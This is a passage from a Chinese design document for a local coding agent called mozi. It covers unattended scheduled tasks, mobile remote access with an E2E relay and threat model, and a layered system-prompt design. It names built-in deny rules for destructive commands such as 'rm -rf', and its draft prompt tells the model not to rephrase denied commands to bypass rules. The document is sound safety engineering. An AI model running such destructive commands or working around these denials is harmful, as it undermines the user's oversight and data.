  policy: UnattendedPolicy;       // 见 13.5（无人值守专用，非普通 PolicyConfig）
  sandboxLevel: 0 | 1 | 2 | 3;    // 默认 2；full 行为建议 3
  artifact: 'report-only' | 'branch' | 'pr' | 'direct';   // 产物策略，见 13.6
  maxSteps?: number;              // 默认 30（无人值守收紧）
  maxCostUsd?: number;            // 单次运行成本上限（默认 $1.0）
  timeoutMs?: number;             // 默认 1_800_000（30 分钟）
  env?: Record<string, string>;   // 附加环境变量（$VAR 引用透传）
}

export interface TaskState {
  lastRunAt?: string; lastRunId?: string; nextRunAt?: string;
  lastStatus?: 'success' | 'failed' | 'skipped-overlap' | 'skipped-cooldown' | 'timeout';
  consecutiveFailures: number;    // 连续失败计数（熔断用，见 13.10）
  totalRuns: number;
}
```

**任务清单存储**：`~/.mozi/tasks/tasks.json`（全部任务，原子写 + .bak 备份，复用 M7 迁移机制 `schemaVersion`）。

**与 M12 模板复用**：`agentTemplate` 存在时，headless 会话的 systemPrompt / 工具集 / 策略上限取自该模板（无 Supervisor、无父会话——模板直接应用于主会话）。这让「定时跑 reviewer 审查」开箱即用。

### 13.4 触发求解：cron 解析、时区与错过补跑

```
求解器（scheduler/solver.ts，纯函数）：
  nextRun(spec, from): Date
  - cron：cron-parser（成熟库）按 spec.schedule.timeZone 求解；
    时区用 Intl API（零依赖），任务列表渲染时显示「下次运行（本地时区换算）」
  - interval：from + everyMinutes（对齐到整分钟）
  - once：固定时刻；已过期 → 立即触发一次后 disable

tick 主循环（每分钟）：
  for task of tasks.filter(enabled):
    if task.state.nextRunAt === undefined: task.state.nextRunAt = nextRun(task, now)
    if task.state.nextRunAt <= now:
      if overlapGuard(task) → 执行 or 跳过（13.7）
      task.state.nextRunAt = nextRun(task, now)   // 先推进（防执行中崩溃导致重复触发）

错过补跑（missed policy，电脑关机错过 N 次触发）：
  tick 启动（或 daemon 启动）时发现 lastRunAt 落后 nextRunAt 多个周期：
    'catch-up-once'（默认）：补跑 1 次（最新状态），日志记录 missed N runs
    'skip'：跳过错过的，直接对齐当前
    'catch-up-all'：逐次补跑（谨慎任务用，如数据同步）
  一次性任务错过 → 立即补跑一次后 disable
```

### 13.5 无人值守安全模型（本模块核心差异点）

没有人在旁边 → **ask 是不可能被应答的**。设计原则：ask 语义在无人值守下静态化、提前化。

```ts
export interface UnattendedPolicy {
  mode: 'readonly' | 'allowlist' | 'full';
  /** allowlist 模式：白名单外的 shell/写操作直接 deny（模型可自纠走安全路径） */
  allowlist?: {
    commands?: string[];      // shell 命令前缀白名单：['npm test', 'npm run build', 'git status']
    writePathGlobs?: string[];// 可写路径 glob：['src/**', 'test/**']
  };
  /** v1.4（M14 联动）：ask 的处置策略——deny 静态化（默认）或升级推送移动端审批 */
  askEscalation?: 'deny' | 'mobile';   // 'mobile' 时 ask 推送已配对设备，超时 5 分钟回落 deny
}

模式语义（经 PolicyEngine 合成，M6 联动）：
┌────────────┬───────────────────────────────┬─────────────────┐
│ readonly   │ 全部工具只读；写/exec 全 deny     │ 报告类任务默认    │
│ allowlist  │ 白名单内 allow；白名单外 **deny** │ 修复类任务默认    │
│ full       │ 全放行（deny 内置规则仍生效）      │ 须 sandboxLevel≥3│
└────────────┴───────────────────────────────┴─────────────────┘

关键不变式（与交互模式的差异）：
  I1 无人值守下不存在 'ask' 决策——合成阶段把一切 ask 替换为 deny（PolicyEngine
     增加 context.isUnattended 分支；交互模式行为完全不变）
  I2 deny 结果携带原因（「白名单外命令，无人值守模式自动拒绝」），模型可自纠
  I3 内置高危 deny 规则（rm -rf 等，M6 §6.1.2）在所有模式下不可绕过
  I4 full 模式强制 sandboxLevel ≥ 3（容器）；不满足 → 任务创建时校验失败
  I5 成本上限 maxCostUsd 触发 → 中止运行 + 失败通知（复用 M1 maxCost 机制）

配置校验（mozi task add 时静态检查，不等到运行时才炸）：
  - readonly + artifact=branch/pr → 警告（只读任务通常无产物分支）
  - full + artifact=direct → 拒绝创建（无人值守直改工作区 + 全放行 = 不可接受）
  - allowlist 未配置任何白名单 → 拒绝（等价全 deny，必是配置错误）
```

### 13.6 执行流程与 workspace 隔离（产物策略）

**核心问题**：定时任务直接在用户工作区跑，会把未提交的改动搞乱。设计为默认隔离执行：

```
mozi task run <taskId>（headless 子进程）：

0. 前置检查：workspace 存在、磁盘余量、并发锁
1. workspace 准备（按 artifact）：
   ┌ report-only ─ 直接在 workspace 只读访问（readonly 策略天然安全）
   ├ branch ─ git worktree 隔离（默认，git 仓库时）：
   │    git worktree add <~/.mozi/tasks/worktrees/<taskId>-<ts>> -b mozi/task/<taskId>/<ts>
   │    · 基于 HEAD 或指定 base（spec 可扩展 baseRef）
   │    · 会话 workspace 指向 worktree 路径（M6 边界随之）
   ├ pr ─ 同 branch，结束时再走 PR 创建（见 3'）
   └ direct ─ 不隔离直接跑（需任务配置显式声明 + workspace 文件锁 13.7 + 仅 allowlist）
2. 组装 headless 会话：
   sessionId = task-<taskId>-<ts>；systemPrompt = 模板（若配）或默认无人值守提示：
   「你是无人值守定时任务执行者。用户不在场：不可请求确认；被拒绝的操作请改用
    安全替代方案或记录到报告；结束时输出结构化报告（结论/改动清单/遗留问题）。」
   prompt = spec.prompt + 运行上下文注入（第 N 次运行/上次结果摘要可配 includeLastRun）
3. engine.run()（复用 M1 全链路：工具/子智能体/MCP 可用；事件写 runs/<runId>/）
3'. 产物收集（按 artifact）：
   branch：worktree 内 git add -A && git commit（有改动时）→ 保留分支 mozi/task/...，
          记录 branch 名 + diff 统计到 run 元数据；删除 worktree（保留分支）
   pr：branch 基础上 → git push -f origin <branch>（专用 remote 或同 origin）→
          gh pr create --title "mozi: <任务名> <日期>"（依赖 gh CLI，未装则降级 branch）
   direct：改动留在工作区；报告中列全部改动文件（用户自查）
   report-only：仅报告
4. 报告生成：最后一轮 assistant 消息 + 工具摘要 → runs/<runId>/report.md
5. 通知（13.8）→ 更新 TaskState → 退出码（CI 可判断）
```

**非 git workspace 的 branch/pr 降级**：目录快照副本（文件复制）→ diff 对比产出 patch 文件（`runs/<runId>/changes.patch`），无分支概念（文档说明）。

**worktree 清理**：`mozi task gc` 清理孤儿 worktree（run 崩溃残留）；分支保留策略默认 30 天（与 M7 会话 GC 对齐）。

### 13.7 并发控制与锁（全文件锁，单机）

```
锁层级（~/.mozi/tasks/locks/）：
  L1 tick 锁：tick.lock —— OS tick 与 daemon 同时存在时，tick 主体互斥
     （flock/LockFileEx 独占；拿不到锁直接退出——另一触发源正在跑）
  L2 任务锁：<taskId>.lock —— 同任务 overlap 防护
     overlapPolicy: 'skip'（默认，记录 skipped-overlap）| 'queue'（排队，串行）
  L3 direct 模式工作区锁：<workspaceHash>.lock —— direct 任务与用户交互会话互斥
     （交互会话启动时也检查：提示「定时任务 direct 模式正在此工作区运行」）

锁实现：proper-lockfile（跨平台文件锁），获取失败带超时（5s）与 PID/时间戳记录
     （诊断死锁：lock 文件含 holder pid + acquiredAt，可 mozi task doctor 检测僵尸）

子进程隔离的意义：任务执行是独立 mozi 进程（task run），崩溃/超时杀进程不影响
     tick 调度器；超时由父侧（tick 侧 spawn 的包装器）SIGTERM → 10s → SIGKILL
```

### 13.8 结果持久化与通知

**运行记录布局（M7 扩展）**：

```
~/.mozi/tasks/
├── tasks.json                     # 任务清单
├── locks/                         # 13.7 锁
├── worktrees/                     # 13.6 临时 worktree（run 后清）
└── runs/<taskId>/
    ├── run-<ts>.json              # 运行元数据（status/usage/artifacts/耗时/exitCode）
    ├── run-<ts>/                  # 会话目录（完整 M7 布局：events.jsonl/snapshots/...）
    │   └── report.md              # 结构化报告
    └── run-<ts>/changes.patch     # 非 git 工作区时的产物
```

`run-<ts>.json` 关键字段：`{ runId, taskId, status, startedAt, endedAt, usage, costUsd, artifacts: { branch?, prUrl?, changedFiles[] }, trigger: 'schedule'|'manual', missedRuns }`。

**通知渠道**：

```ts
interface NotificationConfig {
  on: Array<'completed' | 'failed'>;        // 触发时机（failed 含超时/成本超限）
  desktop?: boolean;                        // 桌面通知（daemon/桌面端在跑时可用）
  webhook?: string;                         // 通用 POST JSON（接钉钉/飞书/Slack bot）
  includeReport?: boolean;                  // 通知体带报告摘要（默认 true，摘要 1k 字符）
}

webhook 载荷（通用 schema，用户侧模板适配各家 IM）：
  POST <url> { event, taskId, taskName, status, startedAt, endedAt,
               costUsd, usage, summary, branch?, prUrl?, reportUrl?: 'file://...' }
  · 超时 10s、失败重试 1 次（通知失败不影响任务状态，仅记录）
  · 通知内容过 maskSecret（防 token/密钥泄漏进第三方）
```

### 13.9 CLI 命令与桌面任务中心

```
CLI（mozi task / mozi daemon 子命令族）：
  mozi task add --name "每日审查" --cron "0 9 * * 1-5" \
      --workspace /path/repo --policy allowlist --allow-cmd "npm test" \
      --artifact branch --template reviewer \
      --notify-failed https://hooks.xxx  [--model deepseek-chat]
      # 交互式向导：无参数时逐步提示（name/prompt/cron/策略）
  mozi task list [--all]        # 状态表：下次运行/上次结果/连续失败/启停
  mozi task rm <id> / enable <id> / disable <id>
  mozi task run <id> [--now]    # 手动触发（等同定时触发，走同一执行链路）
  mozi task logs <id> [runId]   # 查看运行报告/事件（默认最近一次）
  mozi task doctor              # 调度自检（OS 注册/锁健康/磁盘/示例触发）
  mozi task gc                  # 清孤儿 worktree 与过期分支
  mozi daemon start|stop|status # 可选常驻进程（实时状态 + 桌面通知 + IPC）
  mozi task tick [--quiet]      # 调度心跳（OS 注册的就是它；幂等）

TUI 会话内：/tasks 查看任务列表（只读 + 跳转提示）

桌面任务中心（M10 扩展，页面⑧）：
  任务列表（状态徽标/下次运行倒计时/连续失败计数）
  创建向导（表单化：cron 可视化选择器 + 策略/产物/通知配置）
  运行历史（每任务展开：报告渲染 + diff 查看（branch 产物）+ 事件回放）
  daemon 状态指示 + 通知开关
```

### 13.10 失败处理与重试

```
失败分类与策略：
  模型/网络错误 → 引擎内已有重试（M4 §4.8）；仍失败 → run failed
  超时          → SIGTERM 强停；已产生改动按 artifact 收集（不回滚分支产物）
  成本超限      → 中止 + failed 通知（报告注明中断点）
  连续失败熔断  → consecutiveFailures ≥ 3 → 自动 disable + 通知
                  （防「每 4 小时烧 $1 且全失败」无人发现；用户处理后再 enable）

失败通知摘要必须包含：错误码、最后一次工具调用、建议排查方向（复用 M2 AgentError 结构）
```

### 13.11 可测试性

```
调度求解器：纯函数穷举（cron 边界：月末/DST 切换/时区/once 过期/interval 对齐）
tick 主循环：注入 TestClock（M1 同款）+ 内存任务表，断言触发/跳过/补跑/推进
无人值守策略：PolicyEngine 合成分支——ask→deny 不变式（I1）参数化测试；
  readonly 任务的写调用、allowlist 外命令、full+L2 拒绝创建（I4）
worktree 流程：真实 git 仓库 fixture → branch 产物断言（分支存在/commit 内容/清理）
锁：并发 tick 双进程实测（仅一个执行）；direct 工作区锁与交互会话互斥
执行链路：ScriptedProvider 驱动 headless run（报告生成/产物收集/退出码）
通知：webhook 桩（本地 http server）断言载荷与重试
E2E：mozi task add → task run --now → 断言 runs/ 产物与退出码（CI 上跳过 OS 注册，直接调 run）
```

### 13.12 模块联动汇总

| 模块 | 联动点 |
|------|--------|
| M1 引擎 | headless run 复用 `run()` + `mozi exec` 通道；maxCost/maxSteps 收紧；TestClock |
| M2 事件 | 运行会话使用标准 AgentEvent（不加新类型）；调度状态走 run 元数据 + IPC 通道，不污染事件流 |
| M6 策略 | `isUnattended` 分支：ask→deny（I1）；full→L3 强制（I4）；审计全记录 |
| M7 持久化 | tasks/tasks.json 原子写；runs/ 布局复用会话存储与 GC；schemaVersion 迁移 |
| M12 模板 | agentTemplate 复用（reviewer/explore/自定义直接应用于 headless 会话） |
| M8 MCP | 任务会话可用 MCP 工具（如接 issue server 自动建 issue）；通知 webhook 复用外部生态 |
| M9/M10 | CLI 子命令族 + 桌面任务中心 + daemon IPC |
| M11 | 13.11 测试矩阵入总表 |

---

## M14 移动端与远程访问（Remote Access & Mobile）

### 14.1 目标与场景

**职责**：让移动设备（手机/平板）作为 mozi 的一等客户端——远程下发任务、实时查看任务细节、审批决策、管理定时任务；同时保证「本地优先」架构下的安全边界（引擎永远跑在用户自己的机器上）。

**核心场景**（按价值排序）：

| 场景 | 移动端体验 |
|------|-----------|
| **审批推送**（杀手级） | 定时任务/会话触发 `approval.required` → 推送 → 手机上一键批准/拒绝（含命令风险分解展示） |
| 通勤下发任务 | 出门前让 mozi 「重构 X 模块并补测试」，地铁上手机查看实时进度与 diff |
| 实时任务观察 | 流式输出、工具调用卡、diff 审阅、子智能体树、token 用量——与桌面同源同渲染 |
| 定时任务管理 | 任务状态/运行历史/报告阅读/手动触发/失败处置 |
| 紧急刹车 | 发现跑偏 → 手机一键 abort 当前 turn |

**与竞品对照**：Codex/Claude Code/Gemini CLI 均无官方移动端（Claude 有 ChatGPT 式 App 但非「连你本地 Agent」）。mozi 的差异：**连的是你自己机器上的本地 Agent**，数据不经第三方托管。

**边界（不做）**：
- 不在移动端跑引擎（引擎永远在用户机器/自托管节点）；
- 不做 mozi 官方运营的云托管多租户服务（保持 NG1 一致；中继服务器开源可自托管）；
- v1 不做移动端离线自治（离线只读缓存 + 指令排队，无本地执行）。

### 14.2 总体架构：三种连接拓扑

```
拓扑一：LAN 直连（默认，家庭/办公网）
  [Mobile] ←WSS(自签证书pinning)→ [mozi 节点（mozi serve / 桌面远程模式）]
  发现：mDNS 广播 _mozi._tcp.local（节点开启远程访问时）

拓扑二：云/自托管中继（跨网络，默认关闭）
  [Mobile] ←WSS(E2E加密)→ [mozi-relay(自托管Docker/云主机)] ←WSS隧道(E2E)→ [mozi 节点]
  中继只做加密信封路由：不可读内容、不可伪造指令（见 14.9）

拓扑三：桌面内嵌远程模式（M10 联动）
  桌面设置开启「远程访问」→ Electron Main 起同一套 @mozi/protocol WebSocket 服务
  （与桌面 UI 共存：同一引擎实例，事件双路扇出——IPC 给渲染进程、WSS 给移动端）

节点侧入口统一：
  mozi serve [--lan] [--relay <url>] [--port 7777]     # headless（CLI 机器）
  桌面设置面板开关（同能力，GUI 化）                     # 桌面机器
```

**关键决策——节点服务复用而非新建**：`@mozi/protocol` 包定义通道语义（M10 §10.3 的 channel 清单直接升级为通用协议），传输适配器三选一：Electron IPC（桌面）、进程内直连（TUI）、WebSocket（远程/移动）。**移动端协议 = 桌面 IPC 协议**，零分叉（3.1 原则 3 的最终兑付）。

### 14.3 协议层（@mozi/protocol）

```
传输：WSS + JSON-RPC 2.0（文本帧）+ 二进制附件通道（binary 帧）

通道（与 M10 §10.3 同源，新增远程管理组）：
  invoke（客户端 → 节点）：
    会话组：session:create/resume/fork/list/delete、run:start、approval:resolve、
           engine:abort（同桌面）
    定时任务组（M13）：task:list/run/enable/disable/logs
    设备组（新增）：device:list、device:revoke、device:rename
    附件组（新增）：attachment:fetch { contentId } → 分片返回
  push（节点 → 客户端）：
    engine:event { sessionId, event: AgentEvent }      # 与桌面 IPC 完全同构
    session:status / task:status / device:events
    push:wake { type, sessionId }                      # 后台唤醒信号（拉取式）

会话语义：
  · 长连接 + 心跳（ping/pong 15s；30s 无响应断开重连）
  · 断线重连：客户端带 lastEventId → 节点从 M7 事件日志重放缺失事件（事件溯源免费收益）
  · 幂等：run:start / approval:resolve 携带客户端生成 requestId（去重，弱网重试安全）
  · 事件压缩：见 14.6（coalescing 只在 WSS 适配器层做，桌面 IPC 不受影响）
```

**多设备并发**：节点侧每连接独立事件游标（lastEventId per device）；引擎 EventEmitter 扇出天然支持（与桌面多窗口同机制）。

### 14.4 配对与设备信任

**首配流程（QR 扫码）**：

```
1. 节点侧（桌面/CLI）：mozi device pair（或设置面板按钮）
   → 生成配对会话：{ nodeId, nodePubKey(Ed25519指纹), 
                     relayUrl(或 lan 地址), pairingCode(6位), ttl: 5min }
   → 屏幕/终端显示二维码（内容为上述 JSON 的紧凑编码）

2. 手机 App 扫码 → 连接节点（直连或经中继）→ pair.request {
     pairingCode, deviceName: "Jing's iPhone", platform: 'ios',
     devicePubKey(Curve25519，App 首次启动生成，存 Keychain/Keystore)
   }

3. 节点验证 pairingCode（5 分钟内有效、单次使用、屏幕确认双保险——
   桌面弹出「iPhone 请求配对 [允许][拒绝]」，CLI 场景回车确认）
   → 注册设备：{ deviceId, devicePubKey, name, permissions: 默认安全档(14.5) }
   → 响应 deviceToken（长期凭证，90 天轮换，服务端可吊销）

4. E2E 密钥协商（中继拓扑）：节点与设备经 X25519 ECDH 派生共享密钥（NaCl box），
   后续所有业务信封端到端加密；中继只见 { toDeviceId, 密文长度, ts }

设备注册表（~/.mozi/devices.json，节点侧）：
  [ { deviceId, name, platform, pubKey, tokenHash, permissions,
      pairedAt, lastSeenAt, revokedAt? } ]
  吊销：mozi device revoke <id>（立即断开该连接 + 使 token 失效）
  节点更换/迁移：全部设备重新配对（nodeId 变更即不信任，防注册表拷贝攻击）
```

**凭据存储**：移动端 deviceToken + 私钥入 Keychain（iOS）/ Keystore（Android），生物识别锁（App 启动 + 高风险操作二次校验）；节点侧只存 tokenHash（SHA-256）。

### 14.5 设备权限模型（移动端 ≠ 全权客户端）

```ts
export interface DevicePermissions {
  viewSessions: true;              // 查看会话与实时细节（默认开）
  viewWorkspaceFiles: boolean;     // 只读浏览工作区文件（diff 审阅辅助，默认 false）
  sendMessage: boolean;            // 向已有会话/新会话下发任务（默认 true）
  approveRequests: 'none' | 'standard' | 'all';   // 审批权：默认 'standard'
  triggerTasks: boolean;           // 手动触发定时任务（默认 true）
  manageDevices: boolean;          // 管理其他设备（默认 false——手机不配管手机）
  changePolicy: boolean;           // 切换审批模式/沙箱（默认 false）
}
```

**高风险审批分级**（移动端安全的核心设计）：

```
RiskAnalyzer（M6）输出命令风险级，审批权按级分层：

  safe / side-effect / network → 移动端可批（approveRequests='standard'）
  high（pipe-exec、rm -rf 目标、写系统路径等）→ 移动端卡片只提供：
      [暂缓] [转交桌面]  ——不提供批准按钮
    · 「转交桌面」：审批单在桌面 UI 高亮 + 桌面通知
    · 「暂缓」：10 分钟后自动 deny（模型自纠）
    · 配置 approveRequests='all'（用户显式放权）+ 生物识别 + 10 秒冷静期
      才能在手机批 high——设置页红色警告文案

原则：策略引擎（M6）评估不变——移动端只是另一个审批 UI 入口，
     没有越权通道；sendApproval 走同一 resolveApproval 通道（M1 §1.4）。
```

**发送任务的策略覆盖**：`changePolicy=false` 的设备发起的会话，策略模式上限为桌面当前配置（无法从手机开 full-auto）；若手机发了任务而桌面策略是 ask 级——审批单同时推送到所有在线客户端，先到先得应答（幂等去重）。

### 14.6 实时事件流与移动端约束

**事件分发管线（WSS 适配器层）**：

```
引擎事件 → 三路消费：
  ├─ 桌面 IPC（全量、无压缩）
  ├─ M7 事件日志（落盘白名单，见 7.3）
  └─ WSS 移动端：
     ① coalescing：message.delta 按 100ms 窗口合并（省流量+省电；
        subagent.progress 200ms；其余事件直发不合并）
     ② 附件外置：DisplayPayload 里的大对象（diff 全文 >8KB、图片）不内联事件，
        改为 contentId 引用 → 客户端按需 attachment:fetch（分片 binary 帧）
     ③ 事件体积上限：单事件序列化 >64KB 拆分或转附件
     ④ 后台模式：App 退后台 → 只推 push:wake（不含内容），
        回前台 → lastEventId 增量重放补齐

断线续传（利用 M7）：
  客户端记录每会话 lastEventId（事件序列号）
  重连 → session:attach { sessionId, lastEventId }
       → 节点读 events.jsonl 从该序号重放（跳过 delta——按 7.3 白名单只回放权威事件）
       → 接续实时流
  （会话已被 GC/不存在 → 返回 session:gone → App 归档本地缓存）
```

**移动端渲染分工**：DTO 复用 `@mozi/shared`（M2），渲染器为 RN 组件（非 Web Monaco）：diff 用轻量语法高亮（shiki 的 WASM 子集或 highlight.js 核心包），只读。渲染模型与 M9/M10 共享同一 RenderItem 语义。

### 14.7 推送通知架构

**设计原则：推送载荷零内容**（隐私 + 绕开平台内容审查/大小限制）——推送只携带 `{type, sessionId, ts}`，内容靠 App 被唤醒后连接拉取。

```
触发点（节点侧统一 PushHub）：
  tool.approval.required / subagent.approval.required → 最高优先级（响铃+震动可配）
  task.completed / task.failed（M13）→ 含失败原因摘要标志
  subagent.completed、cost 告警（maxCost 80%）→ 普通
  （message.delta / progress 绝不推送）

PushGateway 接口（节点侧可插拔）：
  ┌─ 无（默认）：LAN 前台实时 + 后台无推送（iOS 局限文档说明）
  ├─ ntfy / UnifiedPush（自托管推送，开源自托管用户推荐）
  └─ FCM+APNs（需云中继配套持有推送凭据；自托管中继也可自配 FCM/APNs 密钥）

通知点击 → App 启动 → session:attach 拉取 → 审批卡/报告呈现 → 一键操作
```

### 14.8 移动端应用设计（apps/mobile）

**技术选型**：Expo（React Native）+ TypeScript——与 monorepo 全 TS 统一、`@mozi/shared`/`@mozi/protocol` 直接复用类型、OTA 更新走 Expo Updates（审批 UI 修复不必走应用商店）。PWA 作为轻量只读备选（快速查看场景）。

```
页面结构：
① 配对页：扫码 → 生物识别确认 → 设备命名
② 会话列表：项目分组、状态徽标（运行中/待审批/空闲）、未读审批红点
③ 会话视图（核心）：
   流式输出（delta 合并渲染，跟随模式）
   工具调用卡：名称/参数摘要/耗时/状态；shell 卡显示分段风险着色（复用 M6 拆解结果）
   diff 审阅卡：轻量语法高亮 + 行内折叠 + 左右滑动采纳建议（只读展示）
   子智能体树（M12）：节点状态/进度环，点开查看子会话重放
   用量条：token/成本实时（token.usage 聚合）
   输入区：文本 + 语音转文字（系统输入法原生）+ @文件引用（按需拉取工作区树）
④ 审批收件箱：全部待审批聚合（跨会话/跨任务），风险分级徽标，
   high 级仅显示[暂缓][转交桌面]（14.5）
⑤ 定时任务页：任务列表/状态/下次运行；运行历史 → 报告渲染 + changes.diff 查看；
   手动触发（triggerTasks 权限）
⑥ 设置：节点管理（多节点切换）、设备锁（生物识别）、通知偏好、E2E 密钥指纹校验

离线策略：
  · 最近 N 会话只读缓存（SQLCipher 加密本地库）
  · 指令队列：断网时发送请求本地排队（requestId 幂等键），恢复后重放
  · 无网时审批不可用（安全优先——不允许离线批准）
```

### 14.9 中继服务器（packages/relay-server）

```
定位：无内容路由器 + 推送网关。开源、自托管（docker run mozi-relay）、单用户多设备。

职责（刻意极简）：
  ① 设备↔节点加密信封路由（按 deviceId/nodeId 寻址；中继不持业务密钥）
  ② 在线状态管理（lastSeen，断线通知对端）
  ③ 推送转发（对 offline 设备按其配置的 PushGateway 发送零内容唤醒）
  ④ 配对中转（pairing envelope 转发，配对码校验仍在节点侧）

不可为（威胁模型倒逼的架构约束）：
  ✗ 不可解密任何业务信封（E2E，无中间密钥）
  ✗ 不可伪造节点指令（设备只信 nodePubKey 签名的消息——信封内层带节点签名）
  ✗ 不可枚举用户内容（无元数据存储；日志只记路由计数与时长，可整体关闭）

自托管部署：单二进制/Docker，环境变量配置（RELAY_SECRET / PUSH_* 凭据可选）；
健康检查 /healthz；节点侧 mozi serve --relay wss://relay.example.com
```

### 14.10 安全威胁模型汇总

| 威胁 | 场景 | 防护 |
|------|------|------|
| 中继被攻破 | 运营者/入侵者读取流量 | E2E（X25519+NaCl box）业务全加密；中继无密钥；信封内层节点签名防伪造 |
| 手机丢失 | 拿到手机的人下发任务 | 桌面 `mozi device revoke` 秒级吊销；App 生物识别锁；本地缓存 SQLCipher；吊销后 token 立即失效 |
| 局域网 MITM | 同网段抓包/劫持 | LAN 直连用节点自签证书 + 配对时 pinning（公钥指纹绑定）；WSS 强制 |
| 推送通道滥用 | 伪造唤醒/耗电 | 推送零内容（无注入面）；唤醒后仍需 deviceToken 认证 |
| 配对码暴力 | 6 位码被猜 | 5 分钟 TTL + 单次使用 + 节点侧屏幕确认（双因素）+ 速率限制（10 次/窗口锁定） |
| 恶意 App 假冒节点 | 诱导手机连到假节点 | QR 含 nodePubKey 指纹；App 校验后续所有消息节点签名 |
| 审批钓鱼 | 移动端误批高危 | high 级默认不可手机批准（14.5 分级）+ 生物识别 + 冷静期 |
| 远程开 full-auto | 手机端提权 | changePolicy 默认 false；策略评估在节点侧，客户端无权改 |

### 14.11 节点/桌面/CLI 集成

```
CLI：
  mozi serve [--lan|--relay <url>] [--port 7777]     # headless 远程服务
  mozi device pair                                    # 终端二维码（qrcode 库 ASCII 渲染）
  mozi device list / revoke <id> / rename <id> <name>

桌面（M10 设置面板新增，页面⑨）：
  远程访问总开关（默认关；开启时明示安全提示）
  模式选择：仅局域网 / 经中继（填自托管 relay URL）
  配对入口：二维码弹窗 + 等待确认
  设备管理：列表（名称/平台/最后在线/权限档）+ 吊销按钮
  推送配置：PushGateway 选择（无/ntfy/FCM+APNs）
  会话视图：远程设备的操作在桌面事件流中可见（同源事件，含 device:标签
            标注「本条指令来自 iPhone」）

TUI 会话内：/devices 只读查看 + 提示用 CLI 完整管理
```

### 14.12 可测试性

```
协议契约：三传输适配器（Electron IPC / 进程内 / WSS）同一 channel 集行为一致
  （参数化测试：同一组 invoke/push 用例跑三后端）
配对：桩流程（QR 解析/码过期/单次使用/暴力锁定/屏幕确认缺失拒绝）
权限：分级审批矩阵（standard 设备批 high 被拒；all+生物识别链路桩）
实时流：coalescing 时序（虚拟时钟断言 100ms 窗口合并数）；断线续传
  （kill -9 节点进程重启后 lastEventId 重放断言不丢不重）
附件：分片传输/按需拉取/大事件降级为 contentId
中继 E2E：本地起 relay-server，双端连入跑全链路，断言中继日志无明文（正则扫描密文）
推送：PushGateway 桩（唤醒载荷断言零内容）；触发点矩阵
移动端：Detox E2E 冒烟（配对→发任务→看流→审批）；SQLCipher 缓存加密断言
幂等：弱网重放（同 requestId 二次 run:start 只执行一次）
```

### 14.13 模块联动汇总

| 模块 | 联动点 |
|------|--------|
| M1 引擎 | 移动端 = 另一事件订阅者 + resolveApproval 入口（协议同桌面 IPC）；abort 远程可用 |
| M2 事件 | DTO 零改动（可序列化设计的兑付）；coalescing 在适配器层不污染事件定义 |
| M6 策略 | 评估全在节点侧；high 风险审批分级；移动端无策略修改权 |
| M7 持久化 | lastEventId 断线重放；session:gone 处理 GC 会话 |
| M10 桌面 | 远程服务复用 Electron Main 引擎；页面⑨ 设备管理；远程指令在桌面事件流可见 |
| M12 子智能体 | 子会话树/回放在移动端呈现；subagent 审批同样推送手机 |
| M13 定时任务 | 手机查看/触发任务与报告；**无人值守 ask 升级选项**：`askEscalation: 'deny'(默认) \| 'mobile'`——设为 mobile 时，无人值守任务的 ask 推送手机，超时（默认 5 分钟）回落 deny；推送失败立即回落 |
| M8 MCP | 移动端会话内 MCP 工具结果照常渲染；mcp.sampling/elicit 卡片同源推送 |

---

## M15 提示词系统工程（Prompt System）

### 15.1 目标与边界

**职责**：把系统提示词当作受版本管理、可测试、可评测的一等工程资产——分层定义、动态组装、版本追踪、变更防护。Prompt 是 Agent 行为的最大杠杆（同样的引擎与工具，换 prompt 可使任务成功率波动 ±20%），必须工程化。

**不做**：不做 prompt 可视化编辑器；不做自动 prompt 优化（DSPy 类，远期 RFC）；工具级描述词管理已在 M3 §3.6（本文管系统级）。

### 15.2 五层提示词架构

```
L0 基座层（identity.md，静态）      —— mozi 是谁、工作循环、修改准则、安全准则
L1 环境层（每 turn 动态）           —— 工作区、平台、git 状态、日期、模型名
L2 能力层（按需裁剪）               —— 可用工具的使用准则 + 子智能体委派准则（按 enabledTools 裁剪）
L3 策略层（按配置注入）             —— 当前审批模式的行为说明（readonly 下明确"只读"）
L4 任务层（上下文注入，M5 承载）    —— AGENTS.md、记忆（M16）、模板人格（M12）、任务提示（M13）
```

层间独立性原则：L0-L3 由 mozi 版本控制（升级随发布）；L4 来自用户/项目（不可被 L4 覆盖 L0 安全准则——注入位置与格式上物理隔离）。

### 15.3 组装管线（PromptAssembler）

```ts
// packages/core/src/prompts/assembler.ts
export class PromptAssembler {
  /** 缓存 L0/L2 静态段（按内容 hash），每 turn 只重组动态段 */
  build(session: SessionState): string {
    const parts = [
      this.identity,                        // L0（进程级缓存）
      this.environment(session),            // L1：cwd/platform/git branch/日期/executor 模型名
      this.capabilities(session.enabledTools, session.depth),  // L2：裁剪
      this.policyNotes(session.policy),     // L3：分支文案
      // L4 由 ContextManager 注入（M5 P1 层），不在此拼装——保持单一职责
    ];
    return this.enforceBudget(parts.join('\n\n'), 6_000);  // 总预算 6k token
  }
}
```

**预算裁剪序**（超 6k 时）：L2 未使用工具的准则段压缩为单行 → L1 环境细节（保留 cwd 与 git）→ L0 永不裁剪。

**变更可见性**：组装结果 hash 记入 `session.started` 事件与 meta.json（`promptHash`）——任何会话可复现其使用的确切 prompt（调试与评测的基础）。

### 15.4 基座提示词（identity v1 全文草案）

````markdown
你是墨子，一个在用户本地终端运行的编码智能体。你在真实文件系统与 shell 中工作。

# 工作循环
- 先理解后动手：改动任何代码前，必须已读过相关文件；不确定就先读。
- 小步验证：每次改动尽量小且可独立验证；改完立即运行相关测试或构建。
- 失败自纠：命令失败或 patch 被拒时，先完整阅读错误信息，调整方案再试；
  同一方法连续失败 3 次必须更换思路，不要机械重试。
- 任务拆解：超过 5 步的任务先用 todo_list 列计划，完成一项更新一项。

# 代码修改
- edit_file 前必须 read_file（盲改是错误的主要来源）。
- context 行选稳定锚点（函数签名/独特注释），不要用空行或 `}` 做锚。
- 改动影响多个文件时，逐文件小 patch，不要一次巨型 patch。
- 不主动执行 git commit/push，除非用户明确要求。
- 遵守项目既有代码风格与目录约定（见项目 AGENTS.md）。

# 上下文卫生
- 先 grep/glob 定位，再精确 read；避免整目录扫描。
- 大范围调研（读 10+ 文件才能得出结论）委派给 explore 子智能体，只要结论。
- 汇报结论时给出 文件:行号 引用，便于用户核查。

# 安全
- 只在工作区边界内读写；收到越界错误时修正路径，不要尝试绕过。
- 操作被 deny 时：阅读拒绝原因，改用安全替代方案（如改用列目录确认后删除），
  不要尝试换写法绕过同一条规则。
- 用户中断（Esc）后：立即停止，总结已完成与未完成项。

# 沟通
